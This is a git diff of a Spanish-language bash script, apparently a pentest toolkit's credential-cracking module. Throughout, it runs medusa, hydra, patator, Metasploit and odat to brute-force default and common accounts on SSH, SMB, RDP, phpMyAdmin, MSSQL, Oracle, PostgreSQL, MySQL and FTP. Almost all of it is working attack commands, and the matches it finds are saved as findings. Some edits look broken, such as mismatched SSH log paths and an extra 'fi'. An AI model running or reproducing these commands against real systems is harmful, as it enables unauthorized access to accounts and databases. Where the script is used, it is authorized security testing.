@@ -56,10 +56,10 @@ Opciones:
 -d :Diccionario de passwords a usar (opcional)
 
 Ejemplo 1: Ataque de diccionario con passwords personallizados (basados en la palabra "microsoft") + 20 passwords mas usados
-	cracker.sh -e microsoft -t completo
+	cracker.sh -e microsoft 
 
 Ejemplo 2: Ataque de diccionario con lista de passwords
-	cracker.sh -d passwords.txt -t completo
+	cracker.sh -d passwords.txt 
 EOF
 
 exit
@@ -94,22 +94,21 @@ function insert_data () {
 
 
 ### SSH #########
+
+
 if [ -f servicios/ssh_onlyhost.txt ]
 then
-	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
-	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
+	echo -e "\n\t $OKBLUE Encontre servicios de SSH expuestos en  $RESET"	  
+	#interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "echo 'medusa -e n -u root -P top.txt -h _target_ -M ssh' >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent
+	interlace -tL servicios/ssh_onlyhost.txt -threads 10 -c "medusa -e n -u root -P top.txt -h _target_ -M ssh >> logs/cracking/_target__22_passwordAdivinadoServ.txt" --silent &
+
+
+	insert_data
+fi
 		
 fi
 
 			
-if [ -f servicios/ssh_onlyhost.txt ]
-then
-		
-	for ip in $(cat servicios/ssh_onlyhost.txt); do			
-		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt 2>/dev/null					
-	 done	
-	insert_data
-fi
 ####################
 
 ### Windows
@@ -120,6 +119,7 @@ then
 	
 	interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l administrator -P top.txt -t 1 _target_  smb' >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
 	interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l administrator -P top.txt -t 1 _target_  smb >> logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
+	
 	
 	#interlace -tL servicios/Windows.txt -threads 10 -c "echo -e '\n hydra -l soporte -P top.txt -t 1 _target_  smb' >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
 	#interlace -tL servicios/Windows.txt -threads 10 -c "hydra -l soporte -P top.txt -t 1 _target_  smb >>  logs/cracking/_target__445_passwordAdivinadoWin.txt 2>/dev/null" --silent
@@ -214,7 +214,7 @@ if [ -f servicios/rdp.txt ]; then
 		
 
 		# user = administrator
-		patator rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3
+		patator rdp_login host=$ip user=administrator password=FILE0 0=top.txt  -l logs/cracking/rdp3 2>/dev/null
 		logFile=`grep OK logs/cracking/rdp3/* | head -1| cut -d ":" -f1`				
 		if [ -z "$logFile" ]; then
 			echo "Upps no se encontro passwords"
@@ -230,9 +230,7 @@ if [ -f servicios/rdp.txt ]; then
 				cp $logFile logs/cracking/"$ip"_"$port"_rdpPass.txt 2>/dev/null
 			fi
 		fi
-		rm logs/cracking/rdp3/* # borrar logs
-
-		#https://github.com/m4ll0k/SMBrute (shared)											
+		rm logs/cracking/rdp3/* # borrar logs									
 	 done	
 	 insert_data
 
@@ -298,12 +296,13 @@ then
 		
 		if [[ $fingerprint = *"phpmyadmin"* ]]; then
 			echo -e "\t[+] phpMyAdmin identificado"
-			echo "passWeb.pl -t $ip -p $port -m phpmyadmin -d \"/$path/\" -u root|admin|wordpress|joomla|drupal -f top.txt" > logs/cracking/"$ip"_mongo_passwordBD.txt 
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u root -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u admin -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u wordpress -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u joomla -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
-			passWeb.pl -t $ip -p $port -m phpmyadmin -d "/$path/" -u drupal -f top.txt >> logs/cracking/"$ip"_mongo_passwordBD.txt &
+			echo "passWeb.pl -t $ip -p $port -m phpmyadmin -d \"/$path/\" -u root|admin|wordpress|joomla|drupal|phpmyadmin -f top.txt" > logs/cracking/"$ip"_"$port"_passwordBD.txt 
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u root -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u admin -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u wordpress -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u joomla -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u drupal -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt&
+			passWeb.pl -t $ip -p $port -m phpmyadmin -d "$path/" -u phpmyadmin -f top.txt >> logs/cracking/"$ip"_"$port"_passwordBD.txt &
 			sleep 5
 			######## wait to finish########
 			while true; do
@@ -319,7 +318,9 @@ then
 			done
 			##############################
 
-			grep --color=never 'encontrado' logs/cracking/"$ip"_mongo_passwordBD.txt | sort | uniq > .vulnerabilidades/"$ip"_mongo_passwordBD.txt 
+			grep --color=never 'encontrado' logs/cracking/"$ip"_"$port"_passwordBD.txt | sort | uniq > .vulnerabilidades/"$ip"_"$port"_passwordBD.txt
+			grep --color=never 'Usuario' logs/cracking/"$ip"_"$port"_passwordBD.txt >> .vulnerabilidades/"$ip"_"$port"_passwordBD.txt
+			
 		fi	
 		
 		if [[ $fingerprint = *"joomla"* ]]; then
@@ -550,16 +551,16 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "[+] Probando $ip"						
-		echo "medusa -e n -u sa -P top.txt -h $ip -M mssql" >> logs/cracking/"$ip"_mongo_passwordBD.txt
-		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/"$ip"_mongo_passwordBD.txt
+		echo "medusa -e n -u sa -P top.txt -h $ip -M mssql" >> logs/cracking/"$ip"_mssql_passwordBD.txt
+		medusa -e n -u sa -P top.txt -h $ip -M mssql >> logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
 		
-		echo -e "\n medusa -e n -u adm -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
-		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
+		echo -e "\n medusa -e n -u adm -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mssql_passwordBD.txt
+		medusa -e n -u adm -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mssql_passwordBD.txt 2>/dev/null
 		
 		#echo -e "\n medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql" >>  logs/cracking/"$ip"_mongo_passwordBD.txt
 		#medusa -e n -u $ENTIDAD -P top.txt -h $ip -M mssql >>  logs/cracking/"$ip"_mongo_passwordBD.txt
 		
-		grep --color=never SUCCESS logs/cracking/"$ip"_mongo_passwordBD.txt > .vulnerabilidades/"$ip"_mongo_passwordBD.txt
+		grep --color=never SUCCESS logs/cracking/"$ip"_mssql_passwordBD.txt > .vulnerabilidades/"$ip"_mssql_passwordBD.txt
 		
 	 done	
 	 insert_data
@@ -583,14 +584,14 @@ then
 		port=`echo $line | cut -f2 -d":"`
 		
 		echo -e "[+] Probando $ip"
-		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 2>/dev/null
-		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_mongo_passwordBD.txt
+		msfconsole -x "use auxiliary/admin/oracle/oracle_login;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 2>/dev/null
+		egrep --color=never 'Found' logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt | tee -a .vulnerabilidades/"$ip"_oracle_passwordBD.txt
 
 		SIDS=`grep '|' logs/vulnerabilidades/"$ip"_"$port"_oracleSids.txt | grep -v oracle-sid-brute | awk '{print $2}'`
 		
 		for SID in $SIDS; do
 			echo -e "[+] Probando SID $SID"
-			odat.sh passwordguesser -s $ip -p 1521 -d $SID --accounts-file /usr/share/wordlists/oracle_default_userpass.txt > logs/vulnerabilidades/"$ip"_mongo_passwordBD.txt 
+			odat.sh passwordguesser -s $ip -p 1521 -d $SID --accounts-file /usr/share/wordlists/oracle_default_userpass.txt >> logs/vulnerabilidades/"$ip"_oracle_passwordBD.txt 
 		done		
 		
 	 done	
@@ -623,10 +624,10 @@ then
 		
 		echo -e "[+] Probando $ip"
 		echo "medusa -e n -u postgres -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u postgres -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
 		
 		echo -e "\n medusa -e n -u pgsql -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
-		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
+		medusa -e n -u pgsql -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt 2>/dev/null
 		
 		#echo -e "\nmedusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres" >>  logs/cracking/"$ip"_5432_passwordBD.txt
 		#medusa -e n -u $ENTIDAD -P top.txt -h $ip -M postgres >>  logs/cracking/"$ip"_5432_passwordBD.txt
@@ -675,17 +676,17 @@ then
 			echo "El servicio no esta funcionando correctamente"
 							
 		else
-			echo -e "\n medusa -e n -u root -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
-			medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt
+			echo -e "\n medusa -e n -u root -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt 
+			medusa -e n -u root -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
 			echo -e "\n medusa -e n -u mysql -P top.txt -h $ip -M mysql" >> logs/cracking/"$ip"_3306_passwordBD.txt
-			medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt
+			medusa -e n -u mysql -P top.txt -h $ip -M mysql >> logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
 			echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt
-			medusa -e n -u admin -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt
+			medusa -e n -u admin -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null
 			
 			echo -e "\n medusa -e n -u administrator -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
-			medusa -e n -u administrador -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
+			medusa -e n -u administrador -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt 2>/dev/null			
 			
 			#echo -e "\n medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql" >>  logs/cracking/"$ip"_3306_passwordBD.txt				
 			#medusa -e n -u $ENTIDAD  -P top.txt -h $ip -M mysql >>  logs/cracking/"$ip"_3306_passwordBD.txt				
@@ -835,11 +836,11 @@ then
 		#echo -e "\n medusa -e n -u admin -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 		#medusa -e n -u admin -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 		
-		echo -e "\n medusa -e n -u root -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
-		medusa -e n -u root -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+		echo -e "\n medusa  -u root -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
+		medusa  -u root -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt
 		
-		echo -e "\n medusa -e n -u ftp -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
-		medusa -e n -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
+		echo -e "\n medusa  -u ftp -P top.txt -h $ip -M ftp" >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
+		medusa -u ftp -P top.txt -h $ip -M ftp >>  logs/cracking/"$ip"_21_passwordAdivinadoServ.txt					
 		
 		respuesta=`grep --color=never SUCCESS logs/cracking/"$ip"_21_passwordAdivinadoServ.txt`
 		greprc=$?
@@ -862,6 +863,28 @@ fi
 #echo -e "\t $OKBLUE REVISANDO ERRORES $RESET"
 #grep -ira "timed out" logs/cracking/* 2>/dev/null >> errores.log
 #grep -ira "Can't connect" logs/cracking/* 2>/dev/null >> errores.log
+
+if [ -f servicios/ssh_onlyhost.txt ]
+then
+		
+	######## wait to finish########
+	while true; do
+		medusa_instancias=$((`ps aux | grep medusa | wc -l` - 1)) 
+	if [ "$medusa_instancias" -gt 0 ]
+		then
+			echo -e "\t[i] Todavia hay escaneos de medusa activos ($medusa_instancias)"  
+			sleep 30
+		else
+			break		  		 
+		fi				
+	done
+	##############################
+
+	for ip in $(cat servicios/ssh_onlyhost.txt); do			
+		grep --color=never SUCCESS logs/vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt > .vulnerabilidades/"$ip"_22_passwordAdivinadoServ.txt 2>/dev/null					
+	 done	
+	insert_data
+fi
 
 exit
 
